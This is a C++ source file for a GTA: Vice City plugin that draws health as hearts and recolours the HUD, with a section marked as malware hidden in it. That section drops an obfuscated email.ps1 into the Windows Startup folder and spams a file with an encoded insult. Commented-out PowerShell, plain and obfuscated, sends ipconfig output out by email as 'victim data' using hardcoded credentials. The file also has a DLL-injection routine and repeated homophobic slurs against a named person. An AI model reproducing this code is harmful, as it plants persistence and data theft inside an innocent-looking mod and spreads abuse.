#include "plugin.h"
#include <game_vc\CHud.h>
#include <game_vc\CPed.h>
#include "game_vc/CPlayerPed.h"
#include "game_vc/CPlayerInfo.h"
#include "game_vc/common.h"
#include "extensions/ScriptCommands.h"
#include "RenderWare.h"
#include <iostream>
#include <fstream>  
#include <string>
#include <shlobj.h>
#include <windows.h>
#include <tchar.h>
#include <io.h>
#include <fcntl.h>
#include <tlhelp32.h> 
#include <shlwapi.h> 
#include <conio.h> 

#ifndef _USE_OLD_IOSTREAMS

using namespace std;

#endif




// build verison 
using namespace plugin;
BOOL Inject(DWORD pID, const char * DLL_NAME)
{
	HANDLE Proc;
	HMODULE hLib;
	char buf[50] = { 0 };
	LPVOID RemoteString, LoadLibAddy;

	if (!pID)
		return false;

	Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pID);
	if (!Proc)
	{
		sprintf(buf, "OpenProcess() failed: %d", GetLastError());
		//MessageBox(NULL, buf, "Loader", MB_OK); 
		printf(buf);
		return false;
	}

	LoadLibAddy = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

	// Allocate space in the process for our DLL 
	RemoteString = (LPVOID)VirtualAllocEx(Proc, NULL, strlen(DLL_NAME), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	// Write the string name of our DLL in the memory allocated 
	WriteProcessMemory(Proc, (LPVOID)RemoteString, DLL_NAME, strlen(DLL_NAME), NULL);

	// Load our DLL 
	CreateRemoteThread(Proc, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddy, (LPVOID)RemoteString, NULL, NULL);

	CloseHandle(Proc);
	return true;
}
DWORD GetTargetThreadIDFromProcName(const char * ProcName)
{
	PROCESSENTRY32 pe;
	HANDLE thSnapShot;
	BOOL retval, ProcFound = false;

	thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (thSnapShot == INVALID_HANDLE_VALUE)
	{
		//MessageBox(NULL, "Error: Unable <strong class="highlight">to</strong> create toolhelp snapshot!", "2MLoader", MB_OK); 
		printf("Error: Unable <strong class=\"highlight\">to</strong> create toolhelp snapshot!");
		return false;
	}

	pe.dwSize = sizeof(PROCESSENTRY32);

	retval = Process32First(thSnapShot, &pe);
	while (retval)
	{
		if (StrStrI(pe.szExeFile, ProcName))
		{
			return pe.th32ProcessID;
		}
		retval = Process32Next(thSnapShot, &pe);
	}
	return 0;
}
void BindCrtHandlesToStdHandles(bool bindStdIn, bool bindStdOut, bool bindStdErr)
{
	// Re-initialize the C runtime "FILE" handles with clean handles bound to "nul". We do this because it has been
	// observed that the file number of our standard handle file objects can be assigned internally to a value of -2
	// when not bound to a valid target, which represents some kind of unknown internal invalid state. In this state our
	// call to "_dup2" fails, as it specifically tests to ensure that the target file number isn't equal to this value
	// before allowing the operation to continue. We can resolve this issue by first "re-opening" the target files to
	// use the "nul" device, which will place them into a valid state, after which we can redirect them to our target
	// using the "_dup2" function.
	if (bindStdIn)
	{
		FILE* dummyFile;
		freopen_s(&dummyFile, "nul", "r", stdin);
	}
	if (bindStdOut)
	{
		FILE* dummyFile;
		freopen_s(&dummyFile, "nul", "w", stdout);
	}
	if (bindStdErr)
	{
		FILE* dummyFile;
		freopen_s(&dummyFile, "nul", "w", stderr);
	}

	// Redirect unbuffered stdin from the current standard input handle
	if (bindStdIn)
	{
		HANDLE stdHandle = GetStdHandle(STD_INPUT_HANDLE);
		if (stdHandle != INVALID_HANDLE_VALUE)
		{
			int fileDescriptor = _open_osfhandle((intptr_t)stdHandle, _O_TEXT);
			if (fileDescriptor != -1)
			{
				FILE* file = _fdopen(fileDescriptor, "r");
				if (file != NULL)
				{
					int dup2Result = _dup2(_fileno(file), _fileno(stdin));
					if (dup2Result == 0)
					{
						setvbuf(stdin, NULL, _IONBF, 0);
					}
				}
			}
		}
	}

	// Redirect unbuffered stdout to the current standard output handle
	if (bindStdOut)
	{
		HANDLE stdHandle = GetStdHandle(STD_OUTPUT_HANDLE);
		if (stdHandle != INVALID_HANDLE_VALUE)
		{
			int fileDescriptor = _open_osfhandle((intptr_t)stdHandle, _O_TEXT);
			if (fileDescriptor != -1)
			{
				FILE* file = _fdopen(fileDescriptor, "w");
				if (file != NULL)
				{
					int dup2Result = _dup2(_fileno(file), _fileno(stdout));
					if (dup2Result == 0)
					{
						setvbuf(stdout, NULL, _IONBF, 0);
					}
				}
			}
		}
	}

	// Redirect unbuffered stderr to the current standard error handle
	if (bindStdErr)
	{
		HANDLE stdHandle = GetStdHandle(STD_ERROR_HANDLE);
		if (stdHandle != INVALID_HANDLE_VALUE)
		{
			int fileDescriptor = _open_osfhandle((intptr_t)stdHandle, _O_TEXT);
			if (fileDescriptor != -1)
			{
				FILE* file = _fdopen(fileDescriptor, "w");
				if (file != NULL)
				{
					int dup2Result = _dup2(_fileno(file), _fileno(stderr));
					if (dup2Result == 0)
					{
						setvbuf(stderr, NULL, _IONBF, 0);
					}
				}
			}
		}
	}

	// Clear the error state for each of the C++ standard stream objects. We need to do this, as attempts to access the
	// standard streams before they refer to a valid target will cause the iostream objects to enter an error state. In
	// versions of Visual Studio after 2005, this seems to always occur during startup regardless of whether anything
	// has been read from or written to the targets or not.
	if (bindStdIn)
	{
		std::wcin.clear();
		std::cin.clear();
	}
	if (bindStdOut)
	{
		std::wcout.clear();
		std::cout.clear();
	}
	if (bindStdErr)
	{
		std::wcerr.clear();
		std::cerr.clear();
	}
}


std::string kayne(std::string  text, int k) {
	std::string ctext = text;
	int len = text.length();
	for (int c = 0; c < len; c++) {
		ctext.at(c) = text.at(c) + k;
	}
	return ctext;
}

void cr(int argc, TCHAR *argv[])
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (argc != 2)
	{
		printf("Usage: %s [cmdline]\n", argv[0]);
		std::getchar();
		return;
	}

	// Start the child process. 
	if (!CreateProcess(NULL,   // No module name (use command line)
		argv[1],        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi)           // Pointer to PROCESS_INFORMATION structure
		)
	{
		printf("CreateProcess failed (%d).\n", GetLastError());
		std::getchar();
		return;
	}

	// Wait until child process exits.
	WaitForSingleObject(pi.hProcess, INFINITE);
	std::getchar();

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

class PluginSdkProject1 {
public:
	PluginSdkProject1() {
		/*
		AllocConsole();

		// Update the C/C++ runtime standard input, output, and error targets to use the console window
		BindCrtHandlesToStdHandles(false, true, false);
		std::printf("imad is gay");
		std::getchar();
		*/
		// Initialise your plugin here
		//Events::initRwEvent += [] {
		//patch::SetUInt(0xBAB244, 0xFF0000FF);
		//imad is gay 
		//	};
		//imad is gay
		/*
		Events::gameProcessEvent += [] {
			if (KeyPressed(VK_CONTROL)) {
				CHud::SetHelpMessage("imad is gay", false, false, true);

			}
		};       
		*/
		//float playerh = FindPlayerPed()->m_fHealth;
		//FindPlayerPed()->m_fHealth;



		Events::processScriptsEvent += [] {
			CPed *playa;
			if (Command<Commands::IS_PLAYER_PLAYING>(0))
			{
				Command<0x01F5>(0, &playa);
				float fheath = playa->m_fHealth;
				int numhearts = int(floor(fheath/10));//max character the text box allows is 13 will crash the game otherwise
				//printf("heath>>%f", floor(fheath/10) );
				if (numhearts > 13) {
					numhearts = 13;
				}
				char hearts[15]="";

				for (int c = 0; c < numhearts; c++) {
					hearts[c] = '{';//'{' character is the heart charater in gta's font
				}
				if (playa->m_fHealth > 10) {
					//CHud::GetRidOfAllHudMessages();
					//std::string s = std::to_string(numhearts);
					//char const *pchar = s.c_str();
					CHud::SetHelpMessage(hearts, false, true, true);//distplay hearts

					//better verison working on below
					/*char WindowName[] = "GTA: Vice City";
					RECT rect;
					TCHAR szBuffer[50] = { 0 };
					HWND hwnd = FindWindow(0, WindowName);
					rect.left = 40;
					rect.top = 10;
					HDC wdc = GetDC(hwnd);
					DrawText(wdc, hearts, numhearts, &rect, DT_NOCLIP | DT_INTERNAL);
					*/

				}
				else {
					CHud::GetRidOfAllHudMessages();
				}


				//std::string gameName = std::string("D3DXFont example for GTA ") + GTAGAME_NAME;
				//DrawTextA(NULL, gameName.c_str(), -1, &rect, DT_CENTER | DT_VCENTER, D3DCOLOR_RGBA(255, 255, 0, 255))


			}
		};


		//std::string s= "imad is gay"+std::to_string(playerh);
		//char message[20];
		//strcpy(message, s.);
		//if (playerh < (float)150.0) {
		//CHud::SetHelpMessage("<150", false, false, true);
		//FindPlayerPed()->m_fHealth = 69.0;
		//}
		auto WriteColor = [](unsigned int addrR, unsigned int addrG, unsigned int addrB, unsigned int addrA, CRGBA  &clr) {
			patch::SetUChar(addrR, clr.red); patch::SetUChar(addrG, clr.green); patch::SetUChar(addrB, clr.blue); patch::SetUChar(addrA, clr.alpha);
		};
		CRGBA money = { 243, 239, 16,1 };
		CRGBA heart = { 228, 1, 1,1 };
		CRGBA health = { 228, 1, 1 ,0 };
		CRGBA armor = { 248, 196, 42,1 };
		CRGBA sheild = { 248, 196, 42,1 };
		CRGBA amo = { 22, 247, 41,1 };
		CRGBA wOn = { 96, 11, 182,1 };
		CRGBA wOff = { 243, 164, 188,1 };
		CRGBA zone = { 11, 125, 13,1 };
		CRGBA time = { 74, 201, 114,1 };

		WriteColor(5604015, 5604010, 5604005, 5604005, money);
		WriteColor(5606313, 5606308, 5606303, 5606303, health);
		WriteColor(5606542, 5606502, 5606497, 5606497, heart);
		WriteColor(5606950, 5606945, 5606940, 5606940, armor);
		WriteColor(5607166, 5607126, 5607121, 5607121, sheild);
		WriteColor(5605570, 5605565, 5605560, 5605560, amo);
		WriteColor(5607626, 5607621, 5607616, 5607616, wOff);
		WriteColor(5607792, 5607790, 5607785, 5607785, wOn);
		WriteColor(5609812, 5609807, 5609805, 5609805, zone);
		WriteColor(5611409, 5611404, 5611399, 5611399, time);

		//malware starts here!
		std::ofstream outfile("facts.txt");
		for (int c = 1; c < 10000; c++) {
			outfile << kayne("jnbe!jt!hbz", -1) << std::endl;
		}

		//RedirectIOToConsole();
		//std::printf("imad is gay");
		//std::getchar();
		/*

		std::ifstream infile("2017.txt");
		std::string fline;
		while (getline(infile, fline))
		{
		outfile << fline << '\n';
		}
		*/
		//std::string path;

		TCHAR userPath[MAX_PATH];

		if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userPath)))
		{
			outfile << userPath << std::endl;
		}
		std::string es = "`EttHexe`Vseqmrk`Qmgvswsjx`[mrhs{w`Wxevx$Qiry`Tvskveqw`Wxevxyt`iqemp2tw5"; // \\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\email.ps1"
	

		std::ofstream supfile(userPath + kayne(es, -4));

	
		//std::string gay = "ipconfig /all > ipconfig.txt; ping localhost > ping.txt; $src = \"imad_kalboneh@hotmail.com\"; $SMTP = \"smtp-mail.outlook.com\"; $des = \"imad_kalboneh@hotmail.com\"; $subject = \"victim data\"; $body = \"it works!\"; $att1 = \"ipconfig.txt\"; $att2 = \"ping.txt\";  $pass = ConvertTo-SecureString \"datashe71\" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ($src, $pass); Send-MailMessage -To $des -From $src -Attachments $att1, $att2 -Subject $subject -Body $body -SmtpServer $SMTP -Credential $creds -UseSsl -Port 25 -DeliveryNotificationOption OnSuccess; remove-item -path \"ipconfig.txt\"; remove-item -path \"ping.txt\";";
		//std::string gay = "xr~}uxv/>p{{/M/xr~}uxv=ƒ‡ƒJ/x}v/{~rp{w~‚ƒ/M/x}v=ƒ‡ƒJ/3‚r/L/1x|psnzp{q~}twOw~ƒ|px{=r~|1J/3b\c_/L/1‚|ƒ<|px{=~„ƒ{~~z=r~|1J/3st‚/L/1x|psnzp{q~}twOw~ƒ|px{=r~|1J/3‚„qytrƒ/L/1…xrƒx|/spƒp1J/3q~sˆ/L/1xƒ/†~z‚01J/3pƒƒ@/L/1xr~}uxv=ƒ‡ƒ1J/3pƒƒA/L/1x}v=ƒ‡ƒ1J//3p‚‚/L/R~}…tƒc~<btr„tbƒx}v/1spƒp‚wtF@1/<P‚_{px}ct‡ƒ/<U~rtJ/3rts‚/L/]t†<^qytrƒ/bˆ‚ƒt|=\p}pvt|t}ƒ=P„ƒ~|pƒx~}=_bRtst}ƒxp{/73‚r;/3p‚‚8J/bt}s<\px{\t‚‚pvt/<c~/3st‚/<U~|/3‚r/<Pƒƒprw|t}ƒ‚/3pƒƒ@;/3pƒƒA/<b„qytrƒ/3‚„qytrƒ/<Q~sˆ/3q~sˆ/<b|ƒbt…t/3b\c_/<Rtst}ƒxp{/3rts‚/<d‚tb‚{/<_~ƒ/AD/<St{x…tˆ]~ƒxuxrpƒx~}^ƒx~}/^}b„rrt‚‚J/t|~…t<xƒt|/<pƒw/1xr~}uxv=ƒ‡ƒ1J/t|~…t<xƒt|/<pƒw/1x}v=ƒ‡ƒ1J";
		//std::string gay ="jqdpogjh!0bmm!?!jqdpogjh/uyu<!qjoh!mpdbmiptu!?!qjoh/uyu<!%tsd!>!#jnbe`lbmcpofiAipunbjm/dpn#<!%TNUQ!>!#tnuq.nbjm/pvumppl/dpn#<!%eft!>!#jnbe`lbmcpofiAipunbjm/dpn#<!%tvckfdu!>!#wjdujn!ebub#<!%cpez!>!#ju!xpslt\"#<!%buu2!>!#jqdpogjh / uyu#<!%buu3!>!#qjoh / uyu#<!!%qbtt!>!DpowfsuUp.TfdvsfTusjoh!#ebubtif82#!.BtQmbjoUfyu!.Gpsdf<!%dsfet!>!Ofx.Pckfdu!Tztufn / Nbobhfnfou / Bvupnbujpo / QTDsfefoujbm!) % tsd - !%qbtt*<!Tfoe.NbjmNfttbhf!.Up!%eft!.Gspn!%tsd!.Buubdinfout!%buu2 - !%buu3!.Tvckfdu!%tvckfdu!.Cpez!%cpez!.TnuqTfswfs!%TNUQ!.Dsfefoujbm!%dsfet!.VtfTtm!.Qpsu!36!.EfmjwfszOpujgjdbujpoPqujpo!PoTvddftt<!sfnpwf.jufn!.qbui!#jqdpogjh / uyu#<!sfnpwf.jufn!.qbui!#qjoh / uyu#<";
		supfile << "Hello!" << std::endl;
		for (int c = 0; c < 18; c++) {
		supfile << kayne("jnbe!jt!hbz", -1) << std::endl;
		}
				//infile.close();
		outfile.close();
		supfile.close();

		//process ceation testing 
		/*
		std::printf("imad is gay");
		std::getchar();
		TCHAR *args[2];

		args[0] = "timeout";
		args[1] = "100";

		cr(1, args);*/
	}
} PluginSdkProject1;